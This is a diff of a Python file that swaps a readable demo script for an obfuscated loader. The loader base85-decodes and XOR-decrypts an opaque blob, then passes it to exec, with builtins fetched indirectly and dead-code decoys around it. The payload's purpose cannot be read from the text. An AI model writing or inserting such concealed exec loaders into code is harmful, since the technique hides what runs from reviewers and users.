@@ -1,32 +1,23 @@
-import statistics
-wWmMzh8bL2fkQpRa = int.from_bytes(b'\x07', 'big', signed=False)
-nNqDk4xPs8vTjYcE = {b'mode'.decode(): b'demo'.decode(), b'retries'.decode(): int.from_bytes(b'\x02', 'big', signed=False), b'enabled'.decode(): int.from_bytes(b'\x01', 'big', signed=False)}
-qTzUv3LpSa8dXeFw = [b'Ada'.decode(), b'Bob'.decode(), b'Cy'.decode()]
-
-def TmJrQpLsDzXcVnBw(gHkLpZrTwQmNsYdF: list[int]) -> dict[str, object]:
-    aBcDeFgHiJkLmNoP = sum(gHkLpZrTwQmNsYdF)
-    pQrStUvWxYzAbCdE = round(statistics.mean(gHkLpZrTwQmNsYdF), int.from_bytes(b'\x02', 'big', signed=False))
-    fGhIjKlMnOpQrStU = [vWxYzAbCdEfGhIjK for vWxYzAbCdEfGhIjK in gHkLpZrTwQmNsYdF if vWxYzAbCdEfGhIjK > wWmMzh8bL2fkQpRa]
-    lMnOpQrStUvWxYzA = {bCdEfGhIjKlMnOpQ: rStUvWxYzAbCdEfG for bCdEfGhIjKlMnOpQ, rStUvWxYzAbCdEfG in enumerate(gHkLpZrTwQmNsYdF)}
-    return {b'total'.decode(): aBcDeFgHiJkLmNoP, b'average'.decode(): pQrStUvWxYzAbCdE, b'high_scores'.decode(): fGhIjKlMnOpQrStU, b'indexed_count'.decode(): len(lMnOpQrStUvWxYzA)}
-
-def VbNmLpKoJiUhYgTf(hYtReWqPoLmNkJiU: int):
-    cVbNmAsDfGhJkLqW = hYtReWqPoLmNkJiU
-
-    def ZxCvBnMaSdFgHjKl(qWeRtYuIoPaSdFgH: int) -> int:
-        nonlocal cVbNmAsDfGhJkLqW
-        cVbNmAsDfGhJkLqW += qWeRtYuIoPaSdFgH
-        return cVbNmAsDfGhJkLqW * wWmMzh8bL2fkQpRa
-    return ZxCvBnMaSdFgHjKl
-
-def HnBgVfCdXsZaQwEr() -> dict[str, object]:
-    mKoLpJiUhYgTfRdS = nNqDk4xPs8vTjYcE['retries'] + len(qTzUv3LpSa8dXeFw)
-    return {b'mode'.decode(): nNqDk4xPs8vTjYcE['mode'], b'retry_budget'.decode(): mKoLpJiUhYgTfRdS, b'members'.decode(): qTzUv3LpSa8dXeFw}
-
-if __name__ == '__main__':
-    yUiOpAsDfGhJkLzX = TmJrQpLsDzXcVnBw([int.from_bytes(b'\x04', 'big', signed=False), int.from_bytes(b'\x08', 'big', signed=False), int.from_bytes(b'\x0f', 'big', signed=False), int.from_bytes(b'\x10', 'big', signed=False), int.from_bytes(b'\x17', 'big', signed=False), int.from_bytes(b'*', 'big', signed=False)])
-    iOoPpAaSsDdFfGg = VbNmLpKoJiUhYgTf(int.from_bytes(b'\x03', 'big', signed=False))
-    print(yUiOpAsDfGhJkLzX)
-    print(HnBgVfCdXsZaQwEr())
-    print(iOoPpAaSsDdFfGg(int.from_bytes(b'\x02', 'big', signed=False)))
-    print(iOoPpAaSsDdFfGg(int.from_bytes(b'\x05', 'big', signed=False)))
+_b=__builtins__
+_g=getattr
+_i=isinstance
+_h=(lambda n:(_b[n] if _i(_b,dict) else _g(_b,n)))
+_j=_h('__import__')
+_e=_h('exec')
+_m=_j('base64',globals(),locals(),('b85decode',),0)
+_d=_g(_m,'b85decode')
+_k=_d(b'0bB`3bX}8x')
+_p=_d(b'UO0Rt9|GCOZ5}x!Hy`D<TLfbS9udUMAz>*X7&7tUZ7%~D5Ge5LUJ_0(7eBzZHx+F^D>3r)OcGCLNqzS2bTMo-6)E<LUO0Rt9|FX(PH#{NA~W#8Z7^ykLp1T&Az>*s8z}wc3j=L37dFh-Od2pCKsBntI5&QF5fkgxHheT^7&!fkUO0Rt9|H05at>?@6&}jSbuC*EKP{@zAz>*r0Wg{0WhrVbD?7^cP;Y((A3EQ)Nfv%FASv0PJbYy+7d-#-3j=L37dFi1d2V=iK?3siU@%rJA`R-$UVJoXD+2oMaWi`}D*~B{WjSwWD>>%lY6Dmi8*SggLIq(mI3LycDFbh7RCmnbEqo(wD>k~i3w$YOR5bOVM?GaU5q<LRWqej60Y3QOPzq*uI2_Q~X(>eoG9|mIJA8X004U+^ArfXO5m&RIA$)rx04U+^Ap>u3UIOy0A$B7eA9R`Xbv=D92PyjFa(pyrD>>%lY6Dmi8*SggLIq(mI3LycDFbaX7dFi1d2V=iK?3siU@%rJA`R-$UT`U32PyLOXfJ&(7cR7{Ap>nP7dFh%S2H;aH6F_7bP!7c40X)pbU$JkJ{teRF+WNL0&2<FYae3^BN4i+Ap>nP7dFh%S2H;aH6F_7bP!7c40X)pbU$Jk5(MYbGAm0g6A`A!ODlg902jKfA#@;XRBgJ7bQ(Z)ITgm_aWYVLAsgoHAz>*P5Ge5LUJYL;L=n=%STuYKHXG}xXfl0i5-<GiUOsR$5iY-=V|!IUL~69GA$w~s6MDa(ay4!#5jn2LU@&?jU03I~S7m%CLOSrsOC>%kA#1a}AtzQN0Y3QOPzq*uI2_Q~X(>eoG9|m>CNX9s5qiDkWItvj5p=1bUO0Rt9|FSGZfr#cHw63jO&(7_TtBqrWHDx7S~>RPZa8diSbfaobU$JkB@6tpO&v-e94OzyM<gL7Q!n=Pb2V%<Q*-y_Vl!<bU1zi3WhrVbD-6Z&F%U=uEj8xMLmF{!9W&>yXD((cD?jS=WG^LW7JAS4F>WqvRC@90W_u-P2Q>8VWH>Yd6*1uDC~zql5Ge5LUJYL;L=n=%STuYKHXG}xV|#2V6+i#wWqT(h5kCCnWOXxVD>>%lY6Dmi8*SggLIq(mI3LycDK%#^T07zIYy)dP065^RAwDh}3~i#PEqpE|9XhnEAunJc8aVg8M?GaU5p?c~U^+)G4G8$rP7HW)GY;MJAz>*TD>>%lY6Dmi8*SggLIq(mI3LycDLyU+5InT5WjSgn5IDN5Ap>nP7dFh%S2H;aH6F_7bP!7c40Z9RLo;h&S~>RPZa8diSbfaobU$JkB@6tpO&v-e94OzyM<gL7Qy%K4FF0%@8#(r=Tvh`k5j(T_XE<gyLOaRKP-%H6JS+C-SR^oUCp71%XBuoXJ~GVnWN210Ap+g$JA7p>2Pw$uZzxo5RB)}JWi@IuFD~cuEqrDr9ysvyTxJ7jRDHA8Nk4x!5Ni9wNeOTX1Z?7<JbYFo0Y3QOPzq*uI2_Q~X(>eoG9|m;WhrVbD?j4%Q#nN@Hw4@Ca1LG!1Z2akAv#YY02ln<aydO10SL^_XmtZ;RDH9{Y8WsK9vAu5b}>$K4sF_?JbYFo0Y3QOPzq*uI2_Q~X(>eoG9|m;WhrVbD+-~{G6hEw8a~qOZ9iym9Y4#gAp>nP7dFh%S2H;aH6F_7bP!7c40Yi2U?^ZT05tIPFEMN;8gaAcM>%~B8v@|vH3NJSD--&uEqqoZ0Y3QOPzq*uI2_Q~X(>eoG9|m|Zzv}r1~UHNV<mke2XV9FCIE4FMtZ-XCO%*wQ*pENXgg;j5Mb5eZ7*zYU01W9A$(DFEGyUeSSolI1{tU1H5Dm(R0iPHc?M7z6=mYoWGsGg1V6LpZZ0V_AtlM#UOh23AUNaqHY{sr9W%4$M>%~B8v@|vH3NJSD--&lXgVo0AtlM#UOh23AUNaqHY{srN`2<WNNz+AAvxpjSZ!PZ0Wi*rA$%!kH3HzWV`+UPCmW#GV<kQWRA96Fb_-ewFc;spcs)!5HV5GNJA6e3I1KpMMrko6B{u5WX)h@u8!xl>Ru4x5J`tt)U>QvXE-ve=ArMFlB{s{)G-PWQA0*1?a(rMZR08+)VmDS6A~K`QKp#*q0TI#0d307I0Y3QOPa9z*77nGhNH}pA7(D0APZ}j>5*zmPOEXq95oyfzR0BsYT_BmDA$%z{5h>>KZ+vnX5Ge5LUJYL;L=n=%STuYKHXG}xV|#rl06hPvFF0%@8#(r=JA7Ub7c1iAHZ)2PAtc@KFfAo#D>>%lY6Dmi8*SggLIq(mI3LycDLyVH0yyE}W;rft5IFGfWjP>yR2KNeI2U6L9th;^Mrd<)J#n+&WhrVbD-6Z&F%U=uEj8xMLmF{!7JB>XW;9kb7c$}Ha(gEu5kCCnWOXxVEN{#9MI=x$1r6cEH8?#ESbfaobU$JkB@6tpO&v-e94OzyM<gL7Q#AeLWF%}OD?a@7ZzwKl5IFGfWjP>yR08+)VmDS6A~K`QKp#*q0TI#0d307I0Y3QORuNBr6KVUoKxJYuML6B~RBI(?H3HzWV`+UPCmW#GV<kQWT_Bl?WjSwWJ`K{fQ!Gd}1Zmg9W;R(1JZtK+LNYpkTo2~3QZHx(B09{oQ7UQ(J7=@$Zzv#retol`AuMNhHb3U@QfYp0EiuW{YkV|kCMcuRay?2B69S;ncRxl5epj=gA$)Bj5`Fi_XdPK27%ITQQ#xjL7BA=8R4q6(EHAt3Xlg(#LkZiqa%oWv6*#22AvI?+U46d3AvI?+PFJ&_A$%!kRDJ#LZ!l&g6*05$Z*5B@0WH9_c56^8E)MyMA$%!kRDH9caWXgs7AWJ>G%G$H7ze=WA$K%qA2g-OYHM8&LN2D*N<D0Fetol`A$%!kR4?}QbS`IS1T&(-V<~wQK`Nx#Z3bE`RClxWM-@8?JP7yjZv{9KGARCvA$%!k1~}*Sb22F-Gc?lBWiWmeH4pXgFg|-TE(qeWas+!#emVB$ArnO|GCb<VOATHS6*c6za2QZE1Zm&JPjnz>S!1*0Xg_@%2PxsKAv0?&5kBYLJ60)YRDJg4N*HS%1~%~eIV?OLH8``qAt*i(O(^`fW<Nm<4Ql??HwP{?5h>y6WG^lnRCcr9WhrVbD-6Z&F%U=uEj8xMLmF{!D>>%lY6D&hGGz3$X=O-$A1b2dPb6G$Sbg&5Pc?879}L{kaB5BzIxf13A$%!k1~}*Sb22GBD>>%lY6Dmi8*SggLIq(mI3LycDLyVL8#(r;FF0%@8#(r=JA8d`B4p<8H#=$%J|v{=RBBQf5Ge5LUJYL;L=n=%STuYKHXG}xV|!#M5ID51WjSgn5IDNsEqqoZ0Y3QOPzq*uI2_Q~X(>eoG9|m>CN69<1|-blbU1Dz0D8UTWItvj5p=1bWH~|u76jqzVkR*+K?Ks}EqqoZ0Y3QOPzq*uI2_Q~X(>eoG9|m>CNXR(7C7PaCUR{e7c%$dC}t@p5)=CQR5w@%BrK)JQWAPPel+!<UIS+)892<}Az?IUQv%HGU^QnLD|)GlA$%!k11#mTNe*i;87`%`cojtnRA95;WhrVbD-6Z&F%U=uEj8xMLmF{!4LkSmaB6QII1HxnZWMna90cpRHxFPlSbfOfWhrVbD-6Z&F%U=uEj8xMLmF{!9W&>yXD((cD?jS=WG^LW7JAS4F=#GpRC@90W_u-P2Q>8VWH>Yd6*1uDC~zql5Ge5LUJYL;L=n=%STuYKHXG}xXfl0i5-<GiUOsR$5iY-=V|!IUL}j$BA$w~s6MDa(ay4!#5jn2LU@&?jU2(JDWhrVbD-6Z&F%U=uEj8xMLmF{!9W&>yXD((cD?jS=WG^LW7JAS4F*+`5RC@90W_u-P2Q>8VWH>Yd6*1uDC~zql5Ge5LUJYL;L=n=%STuYKHXG}xXfl0i5-<GiUOsR$5iY-=V|!IUMQyaKA$w~s6MDa(ay4!#5jn2LU@&?jU2(JDWhrVbD-6Z&F%U=uEj8xMLmF{!9W&>yXD((cD?jS=WG^LW7JAS4Fl#PrRC@90W_u-P2Q>8VWH>Yd6*1uDC~zql5Ge5LUJYL;L=n=%STuYKHXG}xXfl0i5-<GiUOsR$5iY-=V|ycDSbenOXge-zR4)4GZ#ivxGCcqDWOY<-etol`AqG4&JvPPiayD^v7C!0pM0_-7D>>%lY6Dmi8*SggLIq(mI3LycDHd4<K@a1>a4bCoH#+&yO%y*qM;`sNIdCZ$5Ge5LUJYL;L=n=%STuYKHXG}xXfl0i5-<GiUOsR$5iY-=V|!IUL~gXKA$w~s6MDa(ay4!#5jn2LU@&?jU38hCA$%zq5Ge5LUJYL;L=n=%STuYKHXG}xaV}sf0CBVTa4I_wCO_oua%wR?JrUih3w$YOR08+)VmDS6A~K`QKp#*q0TI#0d31R-9W&>wAp>nP7dFh%S2H;aH6F_7bP!7c40YVhXc}lfF&DzuRy|=bOf1*gb1XdzF%!C}3w$YOR08+)VmDS6A~K`QKp#*q0TI#0d31R-9W&>wAp>nP7dFh%S2H;aH6F_7bP!7c40Xx1aus3`1}^#dGCpcO02sfZUO0Rt9|FSGZfr#cHw63jO&(7_Tr~akFFJcD83OV7bvb%#R6n%bd2BmiSbenOXge-zR4)4GZ#ivxGCcqDWOX2Jetol`Ap>nP7dFh%S2H;aH6F_7bP!7c40Yr3Xfl0kR08+)VmDS6A~K`QKp#*q0TI#0d2~~92Nd|$b1!2*M?diTbr~gRD>>%lY6Dmi8*SggLIq(mI3LycDK%#^T07zIYy)dP065^RAwDh}3~i>TEqpE|9XhnEAunJc8aVg8M?GaU5p=q#3j')
+def _x(_v,_w):
+    _s=[]
+    _n=0
+    while _n<len(_v):
+        _s.append(_v[_n]^_w[_n%len(_w)])
+        _n+=1
+    return bytes(_s)
+def _q(_f,*_a,**_k):
+    if False and _f is None: return None
+    return _f(*_a,**_k)
+while False:
+    _q(print,'duck')
+_e(_x(_p,_k).decode(),globals(),locals())
